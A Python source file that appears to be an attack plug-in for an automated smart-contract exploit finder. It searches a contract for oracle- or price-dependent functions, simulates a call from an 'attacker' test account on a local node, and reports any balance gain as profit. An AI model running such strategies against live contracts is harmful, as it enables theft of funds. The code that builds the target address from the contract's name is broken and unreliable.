import os
from web3 import Web3
from srg.graph import EdgeType

class OracleManipulationStrategy:
    name = "oracle"

    def __init__(self):
        self.w3 = Web3()

    async def run(self, context: dict, mcp) -> dict:
        srg = context.get("srg")
        srg_summary = context.get("srg_summary", {})
        top_contracts = srg_summary.get("top_contracts", [])
        
        if not top_contracts:
            return {"strategy": self.name, "status": "no_exploit", "profit": 0, "confidence": 0.0}

        contract_name = top_contracts[0].get("name", "")
        target = f"0x{contract_name[:40].ljust(40, '0')}"
        
        # Attacker address
        attacker = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"

        # 1. identify oracle & manipulate price
        selector = "0x00000000"
        if srg:
            print(f"[Attack] Analyzing SRG for oracle patterns in {contract_name}...")
            # Look for functions reading from potential oracles
            oracle_keywords = ["oracle", "price", "feed", "aggregator", "chainlink"]
            
            all_funcs = srg.get_functions(contract_name)
            manipulation_target = None
            
            for f in all_funcs:
                # Does it call something called "Price" or "Oracle"?
                calls = srg.successors(f.id, EdgeType.EXTERNAL_CALL)
                if any(any(kw in c.name.lower() for kw in oracle_keywords) for c in calls):
                     # This function depends on an oracle!
                     # Now find a function that can *affect* this or a related state
                     manipulation_target = f
                     break
            
            if not manipulation_target:
                # Fallback: search by name
                for f in all_funcs:
                    if any(kw in f.name.lower() for kw in ["sync", "update", "poke", "refresh"]):
                        manipulation_target = f
                        break
            
            if manipulation_target:
                print(f"[Attack] Found oracle manipulation candidate: {manipulation_target.name}")
                sig = srg.get_function_signature(manipulation_target.id)
                selector = self.w3.keccak(text=sig).hex()[:10]

        # 2. Get balance before
        bal_before_res = await mcp.call("eth_get_balance", {"address": attacker})
        bal_before = bal_before_res.get("result", {}).get("balance", 0)

        # 3. Simulate manipulation
        await mcp.call("simulate_tx", {
            "from": attacker,
            "to": target, 
            "data": selector
        })
        
        # 4. Get balance after
        bal_after_res = await mcp.call("eth_get_balance", {"address": attacker})
        bal_after = bal_after_res.get("result", {}).get("balance", 0)
        
        profit = bal_after - bal_before
        if profit < 0: profit = 0

        return {
            "strategy": self.name,
            "status": "success" if profit > 0 else "no_exploit",
            "profit": profit,
            "confidence": 0.6 if profit > 0 else 0.0,
            "steps": [
                {"target": target, "data": selector, "value": 0}
            ],
            "rpc_url": os.environ.get("RPC_URL", "http://127.0.0.1:8545")
        }


